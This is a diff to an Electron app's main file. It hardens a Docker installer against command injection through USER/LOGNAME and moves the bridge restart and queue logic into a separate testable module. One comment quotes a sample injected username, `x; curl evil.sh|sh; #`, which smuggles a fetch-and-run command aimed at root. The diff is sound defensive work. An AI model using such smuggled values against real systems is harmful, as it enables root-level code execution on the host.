@@ -2,7 +2,11 @@ const { app, BrowserWindow, ipcMain, dialog } = require('electron');
 const { spawn, spawnSync } = require('child_process');
 const path = require('path');
 const fs = require('fs');
-const readline = require('readline');
+const { buildInstallSteps, displayUsername, isValidUsername, readUsername } = require('./docker_install');
+const {
+  BRIDGE_MAX_FAILURES,
+  createBridgeQueue,
+} = require('./bridge_queue');
 
 // Use Wayland natively when the compositor is available; fall back to X11 otherwise
 app.commandLine.appendSwitch('ozone-platform-hint', 'auto');
@@ -56,8 +60,12 @@ function detectDistro() {
  * fact, not a cosmetic one.
  */
 function isInDockerGroup() {
-  const user = process.env.USER || process.env.LOGNAME;
-  if (!user) return false;
+  // Only used to build `id -nG <user>` (an argument vector) and to compare
+  // against `getent` output, so this is not a shell sink — but an invalid name
+  // is still no use here, so treat it as "not a member" instead of passing
+  // junk to spawn.
+  const user = displayUsername(process.env);
+  if (user === 'your account') return false;  // missing or not a valid username
   // Prefer getent (works for LDAP/SSSD users) and fall back to `id`.
   const getent = spawnSync('getent', ['group', 'docker'], { encoding: 'utf8' });
   if (getent.status === 0 && getent.stdout) {
@@ -91,7 +99,7 @@ async function confirmDockerGroupConsent(user) {
       'Any program running as you — including anything in this app — inherits that\n' +
       'power the moment you agree. Container isolation cannot protect the host from\n' +
       'the account that owns the Docker socket.\n\n' +
-      `To undo this later:  sudo gpasswd -d ${user} docker   (then log out and back in)\n` +
+      'To undo this later:  sudo gpasswd -d <your-user> docker   (then log out and back in)\n' +
       'To install Docker without the group (every command needs sudo): choose Cancel ' +
       'and follow https://docs.docker.com/get-docker/',
     buttons: ['Cancel', 'I understand, add me'],
@@ -104,8 +112,10 @@ async function confirmDockerGroupConsent(user) {
 
 /** Install Docker using the detected package manager, via pkexec/sudo. */
 async function installDocker(pm) {
-  const user = process.env.USER || process.env.LOGNAME;
-  if (!user) throw new Error('Cannot determine the current user name.');
+  // USER/LOGNAME are attacker-influenceable and every step below runs as root,
+  // so they are validated against a strict username allowlist up front. A value
+  // like `x; curl evil.sh|sh; #` is refused here rather than reaching pkexec.
+  const user = readUsername(process.env);
 
   // Consent gate — no `usermod -aG docker` may run without it.
   if (!await confirmDockerGroupConsent(user)) {
@@ -115,47 +125,10 @@ async function installDocker(pm) {
   }
 
   // Each entry is [program, args[]] — run sequentially; any failure throws.
-  const steps = {
-    pacman: [
-      ['pkexec', ['pacman', '-S', '--needed', '--noconfirm', 'docker']],
-      ['pkexec', ['systemctl', 'enable', '--now', 'docker']],
-      ['pkexec', ['usermod', '-aG', 'docker', user]],
-    ],
-    apt: [
-      // Use the convenience script from get.docker.com (handles repo setup)
-      ['pkexec', ['bash', '-c',
-        'curl -fsSL https://get.docker.com | sh && ' +
-        `usermod -aG docker ${user} && ` +
-        'systemctl enable --now docker'
-      ]],
-    ],
-    'dnf-fedora': [
-      ['pkexec', ['bash', '-c',
-        'dnf config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo && ' +
-        'dnf install -y docker-ce docker-ce-cli containerd.io && ' +
-        'systemctl enable --now docker && ' +
-        `usermod -aG docker ${user}`
-      ]],
-    ],
-    'dnf-rhel': [
-      ['pkexec', ['bash', '-c',
-        'dnf config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo && ' +
-        'dnf install -y docker-ce docker-ce-cli containerd.io && ' +
-        'systemctl enable --now docker && ' +
-        `usermod -aG docker ${user}`
-      ]],
-    ],
-    zypper: [
-      ['pkexec', ['bash', '-c',
-        'zypper install -y docker && ' +
-        'systemctl enable --now docker && ' +
-        `usermod -aG docker ${user}`
-      ]],
-    ],
-  };
-
-  const cmds = steps[pm];
-  if (!cmds) throw new Error(`No install recipe for package manager: ${pm}`);
+  // The recipe table lives in ./docker_install.js so it can be tested without
+  // an Electron runtime. No step places `user` inside a `bash -c` string: the
+  // `usermod` call is its own argument vector, so it is never seen by a shell.
+  const cmds = buildInstallSteps(pm, user);
 
   for (const [prog, args] of cmds) {
     const result = spawnSync(prog, args, { stdio: 'inherit' });
@@ -176,7 +149,10 @@ async function warnIfDockerGroupMember() {
   let member = false;
   try { member = isInDockerGroup(); } catch (_) { /* detection failed — stay quiet */ }
   if (!member) return;
-  const user = process.env.USER || process.env.LOGNAME || 'your account';
+  // Display only — these strings are never executed, but an unvalidated
+  // environment value would still be a spoofing vector inside a warning
+  // dialog, so it is reduced to a safe placeholder.
+  const user = displayUsername(process.env);
   await dialog.showMessageBox({
     type: 'warning',
     title: 'Security notice: docker group membership',
@@ -189,7 +165,7 @@ async function warnIfDockerGroupMember() {
       'The isolated browser profiles this app creates are NOT a boundary against\n' +
       'that: the account that owns the Docker socket is already the host.\n\n' +
       'If you did not intend this, remove it with:\n' +
-      `  sudo gpasswd -d ${user} docker\n` +
+      '  sudo gpasswd -d <your-user> docker\n' +
       'then log out and back in (or reboot). Docker will still work for the app\n' +
       'via a root-owned socket only if you reconfigure it — otherwise run the app\n' +
       'as a user you are willing to treat as root.',
@@ -287,7 +263,7 @@ async function checkRequirements() {
     type: 'warning',
     title: 'Docker installed — you now have root-equivalent access',
     message: 'Docker was installed successfully.',
-    detail: `Your user (${process.env.USER || process.env.LOGNAME || 'this account'}) was added to the\n` +
+    detail: `Your user (${displayUsername(process.env)}) was added to the\n` +
             'docker group, which is equivalent to full root access on this host.\n' +
             'This was necessary to run the app, but it applies to every program\n' +
             'running as you, not just this app.\n\n' +
@@ -304,9 +280,10 @@ async function checkRequirements() {
 // ─────────────────────────────────────────────
 // Bridge lifecycle (F8 / T6)
 //
-// Restart policy: exponential backoff, capped, with a hard limit on
-// consecutive failures after which the app stops looping and tells both the
-// renderer and the user that the backend is gone.
+// Restart policy, the request queue and the flush/give-up rules all live in
+// ./bridge_queue.js so they can be tested without an Electron runtime — the
+// regression this file is now wired to was invisible for exactly that reason.
+// See tests/test_bridge_queue.mjs.
 //
 //   attempt 1 fails -> retry in   1s
 //   attempt 2 fails -> retry in   2s
@@ -314,185 +291,41 @@ async function checkRequirements() {
 //   attempt 4 fails -> retry in   8s
 //   attempt 5 fails -> give up, show an error dialog
 //
-// "Consecutive" means the bridge did not survive BRIDGE_STABLE_MS. A bridge
-// that has been up that long counts as a fresh start, so a crash an hour into
-// a session retries immediately instead of inheriting an old backoff. This is
-// what keeps the first-launch path (T6 regression guard) working: the very
-// first startBridge() is not a restart and is never counted as a failure.
-const BRIDGE_BACKOFF_BASE_MS = 1000;
-const BRIDGE_BACKOFF_MAX_MS  = 30000;
-const BRIDGE_MAX_FAILURES    = 5;
-const BRIDGE_STABLE_MS       = 10000;
+// "Consecutive" means the bridge did not survive BRIDGE_STABLE_MS (10s). A bridge
+// that has been up that long counts as a fresh start, so a crash an hour into a
+// session retries immediately instead of inheriting an old backoff. This is what
+// keeps the first-launch path (T6 regression guard) working: the very first
+// startBridge() is not a restart and is never counted as a failure.
+const bridgeQueue = createBridgeQueue({
+  cmd: bridgeCmd,
+  args: bridgeArgs,
+  spawnChild: spawn,
+  // Forward Python tracebacks to console in dev
+  forwardStderr: (d) => { if (!app.isPackaged) process.stderr.write(d); },
+  notifyRenderer: ({ reason, message }) => mainWindow?.webContents.send('bridge:failed', { reason, message }),
+  onGiveUp: async ({ message }) => {
+    const { response } = await dialog.showMessageBox({
+      type: 'error',
+      title: 'Backend unavailable',
+      message: 'Chrome Isolation could not start its background service.',
+      detail: `${message}\n\n` +
+              `It failed to start ${BRIDGE_MAX_FAILURES} times in a row. ` +
+              'Any action that was in flight has been cancelled — please retry it.\n\n' +
+              'Common causes: the bundled bridge is missing or not executable, ' +
+              'Python is not installed, or the app directory is read-only.',
+      buttons: ['Retry', 'Quit'],
+      defaultId: 0,
+      cancelId: 1,
+    });
+    return response === 0 ? 'retry' : 'quit';
+  },
+  onQuit: () => app.quit(),
+});
 
-let bridge = null;
-const pendingRequests = new Map(); // id → { resolve, reject, sent }
-let pendingQueue = []; // { id, payload } queued while the bridge is not up yet
-let reqCounter = 0;
-let bridgeFailures = 0;   // consecutive restarts that never reached 'stable'
-let bridgeStopped = null; // set to an Error once we have given up
-let restartTimer = null;
-let stableTimer = null;
-
-/**
- * Reject only the requests that were actually written to a bridge that is now
- * dead. Queued-but-unsent requests are retried, not lost: a payload that never
- * reached a process cannot have been acted on, so there is nothing to lose.
- */
-function failInFlightRequests(message) {
-  for (const [id, p] of pendingRequests) {
-    if (p.sent) p.reject(new Error(message));
-    pendingRequests.delete(id);
-  }
-  // Anything left was queued for a bridge that is not coming back.
-  for (const { id } of pendingQueue) {
-    const p = pendingRequests.get(id);
-    if (p) p.reject(new Error(message));
-  }
-  pendingQueue = [];
-}
-
-/** Give up restarting: stop the loop and surface the failure to the user. */
-async function bridgeGiveUp(reason) {
-  const message = `The Chrome Isolation backend (${bridgeCmd}) could not be started: ${reason}`;
-  bridgeStopped = new Error(message);
-  for (const [, p] of pendingRequests) p.reject(bridgeStopped);
-  pendingRequests.clear();
-  pendingQueue = [];
-  if (stableTimer) { clearTimeout(stableTimer); stableTimer = null; }
-  if (restartTimer) { clearTimeout(restartTimer); restartTimer = null; }
-  bridge = null;
-  console.error(`Bridge gave up after ${BRIDGE_MAX_FAILURES} consecutive failures: ${message}`);
-
-  // Tell the renderer (if a window exists) so the UI can stop pretending the
-  // backend is reachable; it is not enough to write to the console.
-  try {
-    mainWindow?.webContents.send('bridge:failed', { reason, message });
-  } catch (_) { /* window torn down */ }
-
-  const { response } = await dialog.showMessageBox({
-    type: 'error',
-    title: 'Backend unavailable',
-    message: 'Chrome Isolation could not start its background service.',
-    detail: `${message}\n\n` +
-            `It failed to start ${BRIDGE_MAX_FAILURES} times in a row. ` +
-            'Any action that was in flight has been cancelled — please retry it.\n\n' +
-            'Common causes: the bundled bridge is missing or not executable, ' +
-            'Python is not installed, or the app directory is read-only.',
-    buttons: ['Retry', 'Quit'],
-    defaultId: 0,
-    cancelId: 1,
-  });
-  if (response === 0) {
-    bridgeStopped = null;
-    bridgeFailures = 0;
-    startBridge();
-  } else {
-    app.quit();
-  }
-}
-
-/** Common path for 'error' and 'exit': back off, or give up. */
-function handleBridgeLoss(reason) {
-  failInFlightRequests(`Bridge unavailable: ${reason}`);
-  bridge = null;
-  if (stableTimer) { clearTimeout(stableTimer); stableTimer = null; }
-
-  bridgeFailures += 1;
-  if (bridgeFailures >= BRIDGE_MAX_FAILURES) {
-    bridgeGiveUp(reason);
-    return;
-  }
-  const delay = Math.min(
-    BRIDGE_BACKOFF_BASE_MS * Math.pow(2, bridgeFailures - 1),
-    BRIDGE_BACKOFF_MAX_MS,
-  );
-  console.error(`Bridge lost (${reason}). Restart attempt ${bridgeFailures}/${BRIDGE_MAX_FAILURES - 1} in ${delay}ms…`);
-  if (restartTimer) clearTimeout(restartTimer);
-  restartTimer = setTimeout(() => { restartTimer = null; startBridge(); }, delay);
-}
-
-function startBridge() {
-  if (bridgeStopped) return;
-  bridge = spawn(bridgeCmd, bridgeArgs, {
-    stdio: ['pipe', 'pipe', 'pipe'],
-  });
-  const child = bridge;
-
-  const rl = readline.createInterface({ input: child.stdout });
-  rl.on('line', (line) => {
-    try {
-      const resp = JSON.parse(line);
-      const pending = pendingRequests.get(resp.id);
-      if (!pending) return;
-      pendingRequests.delete(resp.id);
-      if (resp.error) pending.reject(new Error(resp.error));
-      else pending.resolve(resp.result);
-    } catch (e) { /* ignore non-JSON lines */ }
-  });
-
-  child.stderr.on('data', (d) => {
-    // Forward Python tracebacks to console in dev
-    if (!app.isPackaged) process.stderr.write(d);
-  });
-
-  // A broken pipe must not become an unhandled 'error' event (which would take
-  // the whole app down); the 'exit' handler below does the real recovery.
-  child.stdin.on('error', (err) => {
-    console.error('Bridge stdin error:', err.message);
-  });
-
-  // Both 'error' (spawn failure) and 'exit' land here. 'lost' + the identity
-  // check make sure a single failure is counted once, and that a late event
-  // from a superseded child cannot null out a healthy bridge.
-  let lost = false;
-  const onLoss = (reason) => {
-    if (lost) return;
-    lost = true;
-    if (bridge !== child) return;
-    handleBridgeLoss(reason);
-  };
-
-  child.on('error', (err) => onLoss(`failed to start (${err.message})`));
-  child.on('exit', (code, signal) =>
-    onLoss(signal ? `killed by ${signal}` : `exited with code ${code}`));
-
-  // Surviving the stability window resets the backoff.
-  if (bridgeFailures > 0) {
-    stableTimer = setTimeout(() => {
-      stableTimer = null;
-      bridgeFailures = 0;
-    }, BRIDGE_STABLE_MS);
-  }
-
-  // Flush requests queued while the bridge was starting.
-  if (pendingQueue.length && child.stdin.writable) {
-    const queued = pendingQueue;
-    pendingQueue = [];
-    for (const { id, payload } of queued) {
-      const p = pendingRequests.get(id);
-      if (p) p.sent = true;
-      child.stdin.write(payload);
-    }
-  }
-}
+const startBridge = () => bridgeQueue.startBridge();
 
 /** Send a request to the Python bridge and return a Promise. */
-function callBackend(method, params = {}) {
-  return new Promise((resolve, reject) => {
-    // After the give-up path, reject immediately instead of queueing payloads
-    // that will never be written.
-    if (bridgeStopped) { reject(bridgeStopped); return; }
-    const id = String(++reqCounter);
-    const payload = JSON.stringify({ id, method, params }) + '\n';
-    if (bridge && bridge.stdin.writable) {
-      pendingRequests.set(id, { resolve, reject, sent: true });
-      bridge.stdin.write(payload);
-    } else {
-      pendingRequests.set(id, { resolve, reject, sent: false });
-      pendingQueue.push({ id, payload });
-    }
-  });
-}
+const callBackend = (method, params) => bridgeQueue.callBackend(method, params);
 
 // ─────────────────────────────────────────────
 // IPC handlers  (S3: no HTTP surface)
@@ -663,7 +496,5 @@ app.on('window-all-closed', () => {
 });
 
 app.on('quit', () => {
-  if (restartTimer) clearTimeout(restartTimer);
-  if (stableTimer) clearTimeout(stableTimer);
-  if (bridge) bridge.kill();
+  bridgeQueue.dispose();
 });
